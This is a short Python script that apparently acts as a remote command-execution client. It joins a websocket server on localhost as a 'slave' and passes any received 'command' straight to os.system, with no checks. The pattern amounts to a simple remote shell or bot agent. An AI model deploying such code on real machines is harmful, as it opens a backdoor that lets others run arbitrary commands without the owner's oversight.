from websocket import create_connection
import time
import json
import os

ws = create_connection("ws://localhost:8000")

def send(data):
    global ws
    ws.send(json.dumps(data))
    return

def receive():
    global ws
    return json.loads(ws.recv())

print("Receiving...")
result = ws.recv()
print(result)
send({'role':'slave'})
print("Receiving...")
result = ws.recv()
print(result)
while True:
    result = receive()
    if 'command' in result:
        print(os.system(result['command']))
    time.sleep(1)
